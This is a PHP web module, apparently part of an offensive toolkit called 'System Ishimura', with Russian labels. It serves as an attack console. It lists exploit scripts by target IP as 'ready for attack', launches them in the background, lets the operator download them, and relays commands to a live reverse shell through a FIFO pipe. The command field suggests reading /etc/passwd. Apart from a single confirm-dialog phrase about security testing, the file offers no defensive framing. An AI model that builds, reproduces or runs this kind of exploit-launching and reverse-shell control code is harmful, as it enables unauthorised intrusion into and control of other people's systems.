<?php
/**
 * ==============================================================================
 * SYSTEM ISHIMURA — MODULE: TERROR [REBUILT COMPLIANT WITH FULL TZ EXPORT]
 * ==============================================================================
 */
if (session_status() == PHP_SESSION_NONE) { session_start(); }
require_once '/opt/ishimura/web/config.php';

try {
    $pdo = new PDO("pgsql:host=".DB_HOST.";port=".DB_PORT.";dbname=".DB_NAME, DB_USER, DB_PASS, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
} catch (Exception $e) { die("[-] СУБД Error: " . $e->getMessage()); }

// АСИНХРОННЫЙ АПИ-ОБРАБОТЧИК ЭКСПОРТА И КОМАНД (ПО ТЗ)
if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    
    if ($_GET['action'] === 'get_shell_log') {
        $log_file = '/tmp/terror_shell_out.log';
        echo json_encode(["log" => file_exists($log_file) ? file_get_contents($log_file) : "[*] Ожидание подключения к Reverse Shell..."]); exit;
    }
    if ($_GET['action'] === 'send_cmd' && isset($_GET['cmd'])) {
        $fifo_pipe = '/tmp/terror_shell_in.fifo';
        if (file_exists($fifo_pipe)) {
            $fd = fopen($fifo_pipe, 'w'); fwrite($fd, trim($_GET['cmd']) . "\n"); fclose($fd);
            echo json_encode(["success" => true]);
        } else { echo json_encode(["success" => false, "error" => "FIFO канал отсутствует."]); }
        exit;
    }
    if ($_GET['action'] === 'run_exploit' && isset($_GET['id'])) {
        $stmt = $pdo->prepare("SELECT file_path FROM public.terror_exploits WHERE id = ?;");
        $stmt->execute([$_GET['id']]); $path = $stmt->fetchColumn();
        if ($path && file_exists($path)) {
            exec("python3 " . escapeshellarg($path) . " > /dev/null 2>&1 &");
            echo json_encode(["success" => true]);
        } else { echo json_encode(["success" => false, "error" => "Скрипт не найден."]); }
        exit;
    }
    if ($_GET['action'] === 'clear_exploits') {
        $pdo->exec("TRUNCATE TABLE public.terror_exploits RESTART IDENTITY CASCADE;");
        echo json_encode(["success" => true, "msg" => "Реестр боевых векторов успешно очищен."]); exit;
    }
    // НАДЁЖНЫЙ ФИЗИЧЕСКИЙ СПУСК СКОМПИЛИРОВАННЫХ .PY САКРИПТОВ НА ПК ОПЕРАТОРА (ПО ТЗ)
    if ($_GET['action'] === 'download_py' && isset($_GET['id'])) {
        ob_clean();
        $stmt = $pdo->prepare("SELECT file_path, cve_id FROM public.terror_exploits WHERE id = ?;");
        $stmt->execute([$_GET['id']]); $res = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($res && file_exists($res['file_path'])) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="ishimura_' . str_replace('/', '_', $res['cve_id']) . '.py"');
            readfile($res['file_path']); exit;
        }
        die("Файл отсутствует на диске.");
    }
}

// Загрузка и агрегация хостов
$stmt = $pdo->query("SELECT * FROM public.terror_exploits ORDER BY target_ip ASC, cve_id ASC;");
$raw_exploits = $stmt->fetchAll(PDO::FETCH_ASSOC);

$grouped_terror = [];
foreach ($raw_exploits as $row) {
    $ip = $row['target_ip'];
    if (!isset($grouped_terror[$ip])) { $grouped_terror[$ip] = ['total_vectors' => 0, 'items' => []]; }
    $grouped_terror[$ip]['total_vectors']++; $grouped_terror[$ip]['items'][] = $row;
}
?>

<style>
.terror-card { background: var(--panel-bg); border: 1px solid var(--panel-border); padding: 20px; box-sizing: border-box; margin-bottom: 25px; }
.terror-search { width: 100%; padding: 12px; background: #020203; border: 1px solid var(--panel-border); color: var(--neon-magenta); font-family: inherit; font-size: 13px; box-sizing: border-box; }
.terror-search:focus { outline: none; border-color: var(--neon-magenta); }
.terror-acc-header { background: #111319; border: 1px solid var(--panel-border); padding: 15px; margin-top: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
.terror-acc-header:hover { border-color: var(--neon-magenta); }
.terror-acc-body { display: none; background: #07080b; border: 1px solid var(--panel-border); border-top: none; padding: 15px; box-sizing: border-box; }
.terror-acc-header.open + .terror-acc-body { display: block !important; }
.t-chevron::before { content: '▼ '; display: inline-block; transition: transform 0.2s; color: var(--text-muted); font-size: 10px; }
.terror-acc-header.open .t-chevron::before { transform: rotate(-90deg); color: var(--neon-magenta); }
.t-badge { padding: 2px 6px; font-size: 10px; font-weight: bold; border-radius: 2px; margin-left: 10px; border: 1px solid var(--panel-border); text-transform: uppercase; }
</style>

<div class="module-container">
    <h2 class="cyber-title">ATTACK SYNTHESIS MOD: TERROR // БОЕВОЙ СИНТЕЗАТОР</h2>

    <!-- ИНТЕЛЛЕКТУАЛЬНАЯ ПАНЕЛЬ ФИЛЬТРАЦИИ И ПОИСКА ПО ТЗ -->
    <div class="terror-card border-neon-magenta">
        <div style="display:flex; justify-content:space-between; align-items:center; gap:20px;">
            <input type="text" id="terror_live_search" class="terror-search" onkeyup="filterTerrorInfrastructure()" placeholder="⚡ Начните вводить IP-адрес или сигнатуру CVE для мгновенного поиска в ударном контуре...">
        </div>
    </div>

    <!-- РЕЕСТР БОЕВЫХ ВЕКТОРОВ С СИСТЕМОЙ АСИНХРОННОЙ ОЧИСТКИ ПО ТЗ -->
    <div class="terror-card border-neon-blue">
        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--panel-border); padding-bottom:10px; margin-bottom:15px;">
            <h3 style="margin:0;">Реестр скомпилированных боевых векторов (Группировка по целям)</h3>
            <button onclick="clearTerrorExploitsRegistry()" class="cyber-btn btn-sm" style="color:var(--neon-magenta); border-color:var(--neon-magenta); font-size:10px; padding:4px 10px;">ОЧИСТИТЬ ЗАПИСИ</button>
        </div>
        
        <div id="terror_accordion_wrapper">
            <?php if(count($grouped_terror) > 0): ?>
                <?php foreach($grouped_terror as $host_ip => $data): ?>
                    <div class="terror-host-node" data-ip="<?php echo htmlspecialchars($host_ip); ?>" style="margin-bottom: 8px;">
                        
                        <div class="terror-acc-header" onclick="this.classList.toggle('open')">
                            <div>
                                <span class="t-chevron"></span>
                                <strong style="color:var(--neon-cyan); font-size:14px; font-family:monospace;"><?php echo htmlspecialchars($host_ip); ?></strong>
                                <span class="t-badge" style="color:var(--neon-magenta); border-color:var(--neon-magenta);"><?php echo $data['total_vectors']; ?> векторов готово</span>
                            </div>
                            <div>
                                <span class="t-badge" style="color:var(--neon-green); border-color:var(--neon-green);">READY FOR ATTACK</span>
                            </div>
                        </div>

                        <div class="terror-acc-body">
                            <table class="cyber-table" style="font-size:11px; margin-top:0; width:100%;">
                                <thead>
                                    <tr>
                                        <th style="width:140px;">Сигнатура (CVE)</th>
                                        <th style="width:100px;">Тип контура</th>
                                        <th>Техническое описание вектора доставки</th>
                                        <th style="width:150px; text-align:center;">Действия</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach($data['items'] as $item): ?>
                                        <tr class="terror-exploit-row" data-cve="<?php echo htmlspecialchars($item['cve_id']); ?>">
                                            <td style="color:var(--neon-yellow); font-weight:bold; font-size:12px;"><?php echo htmlspecialchars($item['cve_id']); ?></td>
                                            <td>
                                                <span class="t-badge" style="margin:0; color: <?php echo (isset($item['exploit_type']) && $item['exploit_type'] === 'GITHUB') ? 'var(--neon-purple)' : 'var(--neon-green)'; ?>; border-color: <?php echo (isset($item['exploit_type']) && $item['exploit_type'] === 'GITHUB') ? 'var(--neon-purple)' : 'var(--neon-green)'; ?>;">
                                                    <?php echo htmlspecialchars($item['exploit_type'] ?? 'GENERATED'); ?>
                                                </span>
                                            </td>
                                            <td style="color:#cbd5e1; white-space:normal; line-height:1.4;"><?php echo htmlspecialchars($item['description']); ?></td>
                                            <td style="text-align:center;">
                                                <button onclick="triggerExploitExecution(<?php echo $item['id']; ?>)" class="btn-export" style="color:var(--neon-green); border-color:var(--neon-green); font-size:10px; padding:2px 6px; margin-right:5px;">ЗАПУСК</button>
                                                <button onclick="downloadExploitCode(<?php echo $item['id']; ?>)" class="btn-export" style="color:var(--neon-cyan); border-color:var(--neon-cyan); font-size:10px; padding:2px 6px;">СКАЧАТЬ .PY</button>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>

                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <p style="text-align:center; padding:15px;" class="text-muted">Реестр эксплоитов пуст. Запустите сетевой аудит в модуле Arachna.</p>
            <?php endif; ?>
        </div>
    </div>

    <!-- ТЕРМИНАЛ REVERSE SHELL ПО ТЗ -->
    <div class="interactive-console border-neon-green">
        <h3>Интерактивная консоль перехваченных сессий (Real-Time Reverse Shell)</h3>
        <pre id="terror_shell_box" style="height:160px; background:#020204; color:var(--neon-green); overflow-y:auto; font-size:11px; font-family:monospace; padding:10px; margin:0; white-space:pre-wrap;">[*] Сессии управления отсутствуют. Ожидание входящих сокет-подключений...</pre>
        <div style="margin-top:10px; display:flex; gap:10px;">
            <input type="text" id="terror_cmd_input" class="cyber-textarea" style="height:38px; width:85%; color:var(--neon-cyan); font-weight:bold;" placeholder="whoami && cat /etc/passwd" onkeydown="if(event.key === 'Enter') sendTerrorShellCommand()">
            <button type="button" onclick="sendTerrorShellCommand()" class="cyber-btn" style="width:15%; height:38px; font-size:11px;">SEND</button>
        </div>
    </div>
</div>

<script>
let terrorShellInterval = null;

document.addEventListener("DOMContentLoaded", function() {
    terrorShellInterval = setInterval(updateTerrorShellLog, 1000);
});

// СИНХРОННЫЙ ФИЛЬТР ПО IP И СИГНАТУРАМ CVE ПО ТЗ
function filterTerrorInfrastructure() {
    var query = document.getElementById('terror_live_search').value.toLowerCase().trim();
    
    document.querySelectorAll('.terror-host-node').forEach(function(node) {
        var ip = node.getAttribute('data-ip').toLowerCase();
        var hasMatchingCve = false;
        
        node.querySelectorAll('.terror-exploit-row').forEach(function(row) {
            var cve = row.getAttribute('data-cve').toLowerCase();
            if (cve.includes(query)) {
                hasMatchingCve = true;
                row.style.background = "rgba(255, 215, 0, 0.05)";
            } else {
                row.style.background = "transparent";
            }
        });
        
        if (ip.includes(query) || hasMatchingCve) {
            node.style.display = 'block';
            if (hasMatchingCve && query !== '') {
                node.querySelector('.terror-acc-header').classList.add('open');
            }
        } else {
            node.style.display = 'none';
        }
    });
}

function updateTerrorShellLog() {
    fetch('modules/terror.php?action=get_shell_log')
        .then(function(res) { return res.json(); })
        .then(function(data) {
            var box = document.getElementById('terror_shell_box');
            if (data.log.trim() !== "") {
                box.innerHTML = data.log;
                box.scrollTop = box.scrollHeight;
            }
        });
}

function sendTerrorShellCommand() {
    var input = document.getElementById('terror_cmd_input');
    var cmd = input.value.trim();
    if (!cmd) return;
    
    fetch('modules/terror.php?action=send_cmd&cmd=' + encodeURIComponent(cmd))
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (data.success) { input.value = ""; }
        });
}

function triggerExploitExecution(id) {
    if (!confirm('Запустить выбранный боевой скрипт для тестирования безопасности?')) return;
    fetch('modules/terror.php?action=run_exploit&id=' + id)
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (data.success) { alert('[+] Запуск: Эксплоит успешно запущен в фоновом режиме!'); }
        });
}

// СКАЧИВАНИЕ РЕАЛЬНЫХ ФАЙЛОВ .PY НА ПК ОПЕРАТОРА ПО ТЗ
function downloadExploitCode(id) {
    window.location.href = 'modules/terror.php?action=download_py&id=' + id;
}

function clearTerrorExploitsRegistry() {
    if (!confirm('Вы действительно хотите полностью очистить реестр скомпилированных боевых векторов из СУБД?')) return;
    
    fetch('modules/terror.php?action=clear_exploits')
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (data.success) {
                alert('[+] TERROR СУБД: ' + data.msg);
                location.reload();
            }
        });
}
</script>
